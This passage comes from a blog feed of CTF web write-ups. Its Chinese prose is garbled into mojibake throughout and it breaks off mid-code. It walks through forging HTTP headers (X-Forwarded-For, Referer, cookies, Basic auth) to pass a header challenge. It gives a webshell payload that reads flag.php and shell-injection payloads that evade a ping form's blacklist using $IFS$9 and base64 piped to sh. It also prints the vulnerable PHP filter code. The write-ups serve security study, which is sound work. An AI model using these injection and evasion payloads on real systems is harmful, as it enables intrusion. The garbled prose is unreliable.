    <content type="html"><![CDATA[<h3 id="CNSS-Easy-ezhttp"><a href="#CNSS-Easy-ezhttp" class="headerlink" title="CNSS  [Easy] ezhttp"></a>CNSS  [Easy] ezhttp</h3><p>1.æŸ¥çœ‹é¢˜ç›®æè¿°:<br><img src="/images/2023-9-25-cnss-ezhttp/image-20230814101917413.png" alt="image-20230814101917413"></p><p>è¿™é¢˜è€ƒæŸ¥çš„ä½¿httpçš„è¯·æ±‚ï¼ŒçŒœæµ‹å¯èƒ½æ˜¯è¦å¯¹httpçš„è¯·æ±‚å¤´çš„å„ä¸ªå­—æ®µè¿›è¡Œä¿®æ”¹ï¼Œåˆ™ä½¿ç”¨BPæŸ¥çœ‹è¯¥ç½‘ç«™çš„è¯·æ±‚å¤´</p><p>2.BPæŠ“åŒ…è¯¥ç½‘ç«™:<br><img src="/images/2023-9-25-cnss-ezhttp/image-20230814102106081.png" alt="image-20230814102106081"></p><p>æŸ¥çœ‹å“åº”çš„å†…å®¹ä¸­ï¼Œæœ‰æç¤º:åªæ¥å—CNSSè¯·æ±‚ï¼Œæ¸¸è§ˆå™¨ä¸€èˆ¬çš„è¯·æ±‚æ–¹å¼ä¸ºGETå’ŒPOSTï¼Œè¿™é‡Œåªæ¥å—CNSSè¯·æ±‚ï¼Œè¯´æ˜è¦å°†GETæ”¹æˆCNSS:<br><img src="/images/2023-9-25-cnss-ezhttp/image-20230814102241202.png" alt="image-20230814102241202"></p><p>å‘ç°å¾—åˆ°ä¸åŒçš„å“åº”ç»“æœ:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">åªèƒ½åœ¨å®‰å“å¾®ä¿¡å†…ç½®æµè§ˆå™¨ä¸­è¯·æ±‚<br></code></pre></td></tr></table></figure><p>User-Agent:<a href="https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers/User-Agent">User-Agent - HTTP | MDN (mozilla.org)</a></p><p><img src="/images/2023-9-25-cnss-ezhttp/image-20230814102841034.png" alt="image-20230814102841034"></p><p>è¯­æ³•:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">User-Agent: &lt;product&gt; / &lt;product-version&gt; &lt;comment&gt;<br></code></pre></td></tr></table></figure><p>æµè§ˆå™¨é€šå¸¸ä½¿ç”¨çš„æ ¼å¼ä¸ºï¼š</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">User-Agent: Mozilla/&lt;version&gt; (&lt;system-information&gt;) &lt;platform&gt; (&lt;platform-details&gt;) &lt;extensions&gt;<br></code></pre></td></tr></table></figure><p>æŒ‡ä»¤:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs txt">&lt;product&gt;<br>äº§å“è¯†åˆ«ç ã€‚<br><br>&lt;product-version&gt;<br>äº§å“ç‰ˆæœ¬å·ã€‚<br><br>&lt;comment&gt;<br>é›¶ä¸ªæˆ–å¤šä¸ªå…³äºç»„æˆäº§å“ä¿¡æ¯çš„æ³¨é‡Šã€‚<br></code></pre></td></tr></table></figure><p>ä»¥ç«ç‹çš„UAä¸ºä¾‹:</p><p><img src="/images/2023-9-25-cnss-ezhttp/image-20230814103215869.png" alt="image-20230814103215869"></p><p>ç¤ºä¾‹:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs txt">Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:47.0) Gecko/20100101 Firefox/47.0<br>Mozilla/5.0 (Macintosh; Intel Mac OS X x.y; rv:42.0) Gecko/20100101 Firefox/42.0<br></code></pre></td></tr></table></figure><p>æ‰€ä»¥UAæ˜¯ç”¨äºè¡¨ç¤ºè¯¥ç½‘é¡µå†…å®¹é€šè¿‡ä»€ä¹ˆæµè§ˆå™¨å’Œè®¾å¤‡è¿›è¡Œè®¿é—®çš„</p><p>ç”±é¢˜ç›®æç¤ºå¾—:åªèƒ½åœ¨å®‰å“å¾®ä¿¡å†…ç½®æµè§ˆå™¨ä¸­è¯·æ±‚.</p><p>æ‰€ä»¥æˆ‘ä»¬å¾—æ„é€ ä¸€ä¸ªUAè®©å…¶å˜ä¸ºå®‰å“å¾®ä¿¡å†…ç½®æµè§ˆå™¨ä¸­è¯·æ±‚:<br>payloadï¼ˆé€šç”¨ï¼‰:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">User-Agent: Mozilla/5.0 (Linux; Android 10; XXX Build/QKQ1.190910.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/78.0.3904.96 Mobile Safari/537.36 MicroMessenger/8.0.0.1920(0x2800004D) Process/appbrand2 WeChat/arm32<br></code></pre></td></tr></table></figure><p>å¾—åˆ°å“åº”ç»“æœ:</p><p><img src="/images/2023-9-25-cnss-ezhttp/image-20230814103557930.png" alt="image-20230814103557930"></p><p>å¾—åˆ°æç¤º:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">åªæ¥å—æ¥è‡ªcnss.ioçš„è¯·æ±‚<br></code></pre></td></tr></table></figure><p>Refererï¼š<a href="https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers/Referer">Referer - HTTP | MDN (mozilla.org)</a></p><p><img src="/images/2023-9-25-cnss-ezhttp/image-20230814104023049.png" alt="image-20230814104023049"></p><p><img src="/images/2023-9-25-cnss-ezhttp/image-20230814104054349.png" alt="image-20230814104054349"></p><p><img src="/images/2023-9-25-cnss-ezhttp/image-20230814104124465.png" alt="image-20230814104124465"></p><p>æ‰€ä»¥è¯¥headerså­—æ®µè¡¨ç¤ºçš„æ˜¯å½“å‰é¡µé¢çš„æ˜¯é€šè¿‡å“ªä¸ªæºé¡µé¢ä¸­çš„é“¾æ¥è¿›è¡Œè®¿é—®çš„ï¼Œæç¤ºå¾—åªæ¥å—æ¥è‡ªcnss.ioçš„è¯·æ±‚</p><p>è¯´æ˜éœ€è¦è®¾ç½®è¯¥é¡µé¢çš„æºé¡µé¢ä¸ºcnss.ioï¼š<br>payload:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">Referer:cnss.io<br></code></pre></td></tr></table></figure><p>ç”±äºå½“å‰é¡µé¢çš„headersä¸­æ²¡æœ‰Refererå­—æ®µæ‰€ä»¥éœ€è¦æ‰‹åŠ¨æ·»åŠ è¯¥å­—æ®µ:</p><p><img src="/images/2023-9-25-cnss-ezhttp/image-20230814104519850.png" alt="image-20230814104519850"></p><p>å¾—åˆ°æç¤º:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">åªæ¥å—æ¥è‡ªæœ¬æœºçš„è¯·æ±‚<br></code></pre></td></tr></table></figure><p>X-Forwarded-For:<a href="https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers/X-Forwarded-For">X-Forwarded-For - HTTP | MDN (mozilla.org)</a></p><p><img src="/images/2023-9-25-cnss-ezhttp/image-20230814104909323.png" alt="image-20230814104909323"></p><p><img src="/images/2023-9-25-cnss-ezhttp/image-20230814105227509.png" alt="image-20230814105227509"></p><p>å®ä¾‹ï¼š</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs txt">X-Forwarded-For: 2001:db8:85a3:8d3:1319:8a2e:370:7348<br><br>X-Forwarded-For: 203.0.113.195<br><br>X-Forwarded-For: 203.0.113.195, 2001:db8:85a3:8d3:1319:8a2e:370:7348<br><br>X-Forwarded-For: 203.0.113.195,2001:db8:85a3:8d3:1319:8a2e:370:7348,150.172.238.178<br></code></pre></td></tr></table></figure><p>ç”±æç¤ºå¾—åªæ¥å—æ¥è‡ªæœ¬æœºçš„è¯·æ±‚ï¼Œæ‰€ä»¥è¡¨ç¤ºè¯¥é¡µé¢çš„å®¢æˆ·ç«¯IPåœ°å€éœ€è¦æ˜¯æœ¬æœºçš„IPåœ°å€å³:127.0.0.1</p><p>æ‰€ä»¥å¯ä»¥ä¼ªé€ X-Forwarded-Forçš„å†…å®¹ä¸ºæœ¬æœºåœ°å€:</p><p>payload:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">X-Forwarded-For:127.0.0.1<br></code></pre></td></tr></table></figure><p>å“åº”ç»“æœ:</p><p><img src="/images/2023-9-25-cnss-ezhttp/image-20230814105841408.png" alt="image-20230814105841408"></p><p>å¾—åˆ°æç¤º:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">åªæ¥å—å†…å®¹ç±»å‹ä¸ºapplication/jsonçš„è¯·æ±‚<br></code></pre></td></tr></table></figure><p>Content-Type:<br><img src="/images/2023-9-25-cnss-ezhttp/image-20230814110543771.png" alt="image-20230814110543771"></p><p>æ‰€ä»¥ç”±æç¤ºå¾—æµè§ˆå™¨çš„å‘é€å†…å®¹çš„ç±»å‹ä¸º:application&#x2F;json</p><p>payload:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">Content-Type: application/json<br></code></pre></td></tr></table></figure><p>å“åº”ç»“æœ:</p><p><img src="/images/2023-9-25-cnss-ezhttp/image-20230814110832040.png" alt="image-20230814110832040"></p><p>å¾—åˆ°æç¤º:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">ä½ å€’æ˜¯å‘ä¸ªjsonè¿‡æ¥å•Š<br></code></pre></td></tr></table></figure><p>jsonæ•°æ®:<a href="https://zhuanlan.zhihu.com/p/74151127">JSONæ•°æ®æ ¼å¼è¯¦è§£ - çŸ¥ä¹ (zhihu.com)</a>:</p><p>åŸºæœ¬å½¢å¼:</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span><br>    <span class="hljs-attr">&quot;obj1&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;value1&quot;</span><span class="hljs-punctuation">,</span><br>    <span class="hljs-attr">&quot;obj2&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;123456&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-comment">//æ•°å€¼ä¹Ÿéœ€è¦åŠ å¼•å·</span><br>    <span class="hljs-attr">&quot;obj3&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-punctuation">&#123;</span><br>        <span class="hljs-comment">//åµŒå¥—å‹</span><br>        <span class="hljs-attr">&quot;obj4&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;value2&quot;</span><br>    <span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><br>    <span class="hljs-attr">&quot;obj5&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;value3&quot;</span><br><span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure><p>æ ¹æ®æç¤ºéœ€è¦ä¼ é€ä¸€ä¸ªjsonæ•°æ®ï¼Œç”±äºè¯¥æ¸¸è§ˆå™¨çš„è¯·æ±‚ä¸ºCNSSæ‰€ä»¥æˆ‘ä»¬ä¸çŸ¥é“è¯¥åœ¨å“ªé‡Œä¼ è¾“jsonæ•°æ®ï¼ŒçŒœæµ‹è¯¥è¯·æ±‚çš„ä¼ é€æ•°æ®æ ¼å¼å’ŒPOSTç±»ä¼¼:</p><p>æ„é€ payload:</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span><br>    <span class="hljs-attr">&quot;hacker&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;admin&quot;</span><br><span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure><p>å“åº”ç»“æœ:</p><p><img src="/images/2023-9-25-cnss-ezhttp/image-20230814111723058.png" alt="image-20230814111723058"></p><p>å¾—åˆ°æç¤º:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">èƒ½å‘Šè¯‰æˆ‘ä½ çš„åå­—(name)å—ï¼Ÿ<br></code></pre></td></tr></table></figure><p>ç”±äºheadersä¸­ä¸å­˜åœ¨nameå­—æ®µï¼Œæ‰€ä»¥è¯¥å­—æ®µéœ€è¦æˆ‘ä»¬é€šè¿‡jsonè¿›è¡Œä¼ è¾“:<br>payload:</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span><br>    <span class="hljs-attr">&quot;name&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;admin&quot;</span><br><span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure><p>å“åº”ç»“æœ:</p><p><img src="/images/2023-9-25-cnss-ezhttp/image-20230814112529893.png" alt="image-20230814112529893"></p><p>å¾—åˆ°æç¤º:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">èƒ½å‘Šè¯‰æˆ‘ä½ çš„å¯†ç (password)å—ï¼Ÿ<br></code></pre></td></tr></table></figure><p>è¯´æ˜è¿˜éœ€è¦ä¼ è¾“ä¸€ä¸ªpasswordå­—æ®µçš„å€¼:</p><p>payload:</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span><br>    <span class="hljs-attr">&quot;name&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;admin&quot;</span><span class="hljs-punctuation">,</span><br>    <span class="hljs-attr">&quot;password&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;123456&quot;</span><br><span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure><p>å“åº”ç»“æœ:</p><p><img src="/images/2023-9-25-cnss-ezhttp/image-20230814112928181.png" alt="image-20230814112928181"></p><p>æ ¹æ®æç¤ºæˆ‘ä»¬éœ€è¦åœ¨Cookieä¸­å†™ä¸Šnameå­—æ®µçš„å€¼,ä¿é™©èµ·è§ä¸jsonä¸­çš„å†…å®¹ä¸€è‡´:</p><p>Cookie:<a href="https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers/Cookie">Cookie - HTTP | MDN (mozilla.org)</a></p><p><img src="/images/2023-9-25-cnss-ezhttp/image-20230814113511260.png" alt="image-20230814113511260"></p><p>è¯­æ³•:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs txt">Cookie: &lt;cookie-list&gt;<br>Cookie: name=value<br>Cookie: name=value; name2=value2; name3=value3<br></code></pre></td></tr></table></figure><p><img src="/images/2023-9-25-cnss-ezhttp/image-20230814113558180.png" alt="image-20230814113558180"></p><p>payload:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">Cookie:name=&quot;admin&quot;<br></code></pre></td></tr></table></figure><p>å“åº”ç»“æœ:</p><p><img src="/images/2023-9-25-cnss-ezhttp/image-20230814113202256.png" alt="image-20230814113202256"></p><p>æ ¹æ®æç¤ºéœ€è¦åœ¨Cookieä¸­æ·»åŠ passwordå­—æ®µ:</p><p>payload:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">Cookie:name=&quot;admin&quot;;password=&quot;123456&quot;<br></code></pre></td></tr></table></figure><p><img src="/images/2023-9-25-cnss-ezhttp/image-20230814113321059.png" alt="image-20230814113321059"></p><p>BasicAuthè®¤è¯<a href="https://zhuanlan.zhihu.com/p/64584734">ç§’æ‡‚HTTPåŸºæœ¬è®¤è¯(Basic Authentication) - çŸ¥ä¹ (zhihu.com)</a>ï¼š</p><p><img src="/images/2023-9-25-cnss-ezhttp/image-20230814123944756.png" alt="image-20230814123944756"></p><p>æ ¹æ®æç¤ºå¾—æˆ‘ä»¬éœ€è¦è¿›è¡ŒBasicAuthè®¤è¯ï¼Œå³è®¤è¯æˆ‘ä»¬è¾“å…¥çš„ç”¨æˆ·åå’Œå¯†ç ,éœ€è¦æ·»åŠ Authorizationå­—æ®µ:</p><p>admin:123456çš„base64æ ¼å¼ä¸ºYWRtaW46MTIzNDU2</p><p>payload:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">Authorization: Basic YWRtaW46MTIzNDU2<br></code></pre></td></tr></table></figure><p>å“åº”ç»“æœ:</p><p><img src="/images/2023-9-25-cnss-ezhttp/image-20230814124235654.png" alt="image-20230814124235654"></p><p>flag &#x3D; cnss{y0u_kn0w_h77p_r3qu3st_h4h4!}</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>Polarç§‹å­£ä¸ªäººèµ›WEB_WP</title>
    <link href="/2023/09/24/2023-09-24-polar%E7%A7%8B%E5%AD%A3%E4%B8%AA%E4%BA%BA%E8%B5%9B/"/>
    <url>/2023/09/24/2023-09-24-polar%E7%A7%8B%E5%AD%A3%E4%B8%AA%E4%BA%BA%E8%B5%9B/</url>
    
    <content type="html"><![CDATA[<h1 id="Polarç§‹å­£ä¸ªäººèµ›WEB-WP"><a href="#Polarç§‹å­£ä¸ªäººèµ›WEB-WP" class="headerlink" title="Polarç§‹å­£ä¸ªäººèµ›WEB_WP"></a>Polarç§‹å­£ä¸ªäººèµ›WEB_WP</h1><h4 id="ezupload"><a href="#ezupload" class="headerlink" title="ezupload:"></a>ezupload:</h4><p><img src="/images/2023-9-24-Polar/image-20230923092810825.png" alt="image-20230923092810825"></p><p>url:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">http://2469cefa-72d1-4f8f-a274-87b44a1cc826.www.polarctf.com:8090/uploads/pass1.php<br></code></pre></td></tr></table></figure><p>payload:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">pass=system(&#x27;cat ../flag.php&#x27;);<br></code></pre></td></tr></table></figure><p><img src="/images/2023-9-24-Polar/image-20230923092840078.png" alt="image-20230923092840078"></p><h4 id="å†æ¥pingä¸€æ³¢å•Š"><a href="#å†æ¥pingä¸€æ³¢å•Š" class="headerlink" title="å†æ¥pingä¸€æ³¢å•Š"></a>å†æ¥pingä¸€æ³¢å•Š</h4><p>payload:</p><p>base64ç»•è¿‡æ³•æ ¼å¼:ä½¿ç”¨$IFS$9ä»£æ›¿ç©ºæ ¼ï¼Œshä»£æ›¿bash</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">127.0.0.1|echo$IFS$9Y2F0IC4vaW5kZXgucGhw|base64$IFS$9-d|sh<br></code></pre></td></tr></table></figure><p>dir &#x2F;</p><p><img src="/images/2023-9-24-Polar/image-20230923101128445.png" alt="image-20230923101128445"></p><p>dir ..&#x2F;..&#x2F;:<br><img src="/images/2023-9-24-Polar/image-20230923101348330.png" alt="image-20230923101348330"></p><p>payload:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">127.0.0.1|dir<br></code></pre></td></tr></table></figure><p><img src="/images/2023-9-24-Polar/image-20230923102308231.png" alt="image-20230923102308231"></p><p>payload:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs txt">127.0.0.1|echo cat ./index.php|base64 -d|bash<br>=&gt;ä½¿ç”¨base64ç»•è¿‡æ³•<br>127.0.0.1|echo$IFS$9Y2F0IC4vaW5kZXgucGhw|base64$IFS$9-d|sh<br></code></pre></td></tr></table></figure><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">127.0.0.1|dir$IFS$9..:è¿”å›ä¸Šä¸€çº§ç›®å½•<br></code></pre></td></tr></table></figure><p><img src="/images/2023-9-24-Polar/image-20230923101845558.png" alt="image-20230923101845558"></p><p>æŸ¥çœ‹ç½‘é¡µæºä»£ç :</p><p><img src="/images/2023-9-24-Polar/image-20230923101955812.png" alt="image-20230923101955812"></p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">http-equiv</span>=<span class="hljs-string">&quot;Content-Type&quot;</span> <span class="hljs-attr">content</span>=<span class="hljs-string">&quot;text/html; charset=utf-8&quot;</span> /&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>PolarD&amp;N CTF<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">center</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">h2</span> <span class="hljs-attr">style</span>=<span class="hljs-string">&quot;margin-top: 300&quot;</span>&gt;</span>æ¥åšä¸ªå¤ä¹ <span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">h2</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">form</span> <span class="hljs-attr">action</span>=<span class="hljs-string">&quot;&quot;</span> <span class="hljs-attr">method</span>=<span class="hljs-string">&quot;get&quot;</span> &gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;text&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;ip&quot;</span> <span class="hljs-attr">placeholder</span>=<span class="hljs-string">&quot;Why not try bjut.edu.cn&quot;</span> <span class="hljs-attr">required</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">button</span> <span class="hljs-attr">style</span>=<span class="hljs-string">&quot;margin-left:20;&quot;</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;submit&quot;</span>&gt;</span>ç¡®å®š<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">form</span>&gt;</span><br><br><span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">http-equiv</span>=<span class="hljs-string">&quot;Content-Type&quot;</span> <span class="hljs-attr">content</span>=<span class="hljs-string">&quot;text/html; charset=utf-8&quot;</span> /&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>PolarD&amp;N CTF<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">center</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">h2</span> <span class="hljs-attr">style</span>=<span class="hljs-string">&quot;margin-top: 300&quot;</span>&gt;</span>æ¥åšä¸ªå¤ä¹ <span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">h2</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">form</span> <span class="hljs-attr">action</span>=<span class="hljs-string">&quot;&quot;</span> <span class="hljs-attr">method</span>=<span class="hljs-string">&quot;get&quot;</span> &gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;text&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;ip&quot;</span> <span class="hljs-attr">placeholder</span>=<span class="hljs-string">&quot;Why not try bjut.edu.cn&quot;</span> <span class="hljs-attr">required</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">button</span> <span class="hljs-attr">style</span>=<span class="hljs-string">&quot;margin-left:20;&quot;</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;submit&quot;</span>&gt;</span>ç¡®å®š<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">form</span>&gt;</span><br><br><span class="hljs-meta">&lt;?php</span><br><span class="hljs-meta">    $flag = &#x27;flag&#123;ae5eb824ef87499f644c3f11a7176157&#125;&#x27;;</span><br><span class="hljs-meta">if(isset($_GET[&#x27;ip&#x27;]))&#123;</span><br><span class="hljs-meta">$ip = $_GET[&#x27;ip&#x27;];</span><br><span class="hljs-meta">if(preg_match(&quot;/\&amp;|\/|\?|\*|\&lt;|\&gt;|`|\\|\(|\)|\[|\]|\&#123;|\&#125;/&quot;, $ip, $match))&#123;</span><br><span class="hljs-meta">print_r($match);</span><br><span class="hljs-meta">print($ip);</span><br><span class="hljs-meta">echo &quot;&lt;pre&gt;&quot;;</span><br><span class="hljs-meta">echo preg_match(&quot;/\&amp;|\/|\?|\*|\&lt;|\&gt;|\&#x27;|\&quot;|\\|\(|\)|\[|\]|\&#123;|\&#125;/&quot;, $ip, $match);</span><br><span class="hljs-meta">die(&quot;fxck your symbol!&quot;);</span><br><span class="hljs-meta">&#125;</span><br><span class="hljs-meta">else if(preg_match(&quot;/ /&quot;, $ip))&#123;</span><br><span class="hljs-meta">die(&quot;ç©ºæ ¼æˆ‘å¯æ²¡åŠ éš¾åº¦è¿™å¯çœŸæ˜¯å¤ä¹ ï¼Œ/æ–œçœ¼ç¬‘&quot;);</span><br><span class="hljs-meta">&#125;</span><br><span class="hljs-meta">else if(preg_match(&quot;/bash/&quot;, $ip))&#123;</span><br><span class="hljs-meta">die(&quot;Bash is not allowed&quot;);</span><br><span class="hljs-meta">&#125;</span><br><span class="hljs-meta">else if(preg_match(&quot;/ls/&quot;, $ip))&#123;</span><br><span class="hljs-meta">die(&quot;æˆ‘å¾ˆæŠ±æ­‰ï¼Œå…¶å®ä½ å¾—å†ç ”ç©¶ç ”ç©¶&quot;);</span><br><span class="hljs-meta">&#125;</span><br><span class="hljs-meta">        else if(preg_match(&quot;/cat|tac|sort|head|tail|more|less/&quot;, $ip))&#123;</span><br><span class="hljs-meta">die(&quot;å¸¸ç”¨çš„è¯»å–å‘½ä»¤è‚¯å®šä¸è¡Œï¼Œä½ è¦æ˜¯æƒ³å‡ºç»•è¿‡çš„ä¹Ÿç®—ä½ å‰å®³ã€‚ä½†è¿‡æ»¤æœºåˆ¶æ˜¯æ”¹äº†çš„-ã€‚-ï¼Œä½ å†ç ”ç©¶ç ”ç©¶ï¼Ÿ&quot;);</span><br><span class="hljs-meta">&#125;</span><br><span class="hljs-meta">else if(preg_match(&quot;/rm/&quot;, $ip))&#123;</span><br><span class="hljs-meta">die(&quot;ä½ è¦ææˆ‘ï¼Ÿï¼Ÿï¼Ÿ&quot;);</span><br><span class="hljs-meta">&#125;</span><br><span class="hljs-meta">else if(preg_match(&quot;/index/&quot;,$ip))&#123;</span><br><span class="hljs-meta">die(&quot;é‚£èƒ½è®©ä½ ç›´æ¥è¯»ï¼Ÿ&quot;);</span><br><span class="hljs-meta">&#125;</span><br><span class="hljs-meta">$a = system(&quot;ping -c 4 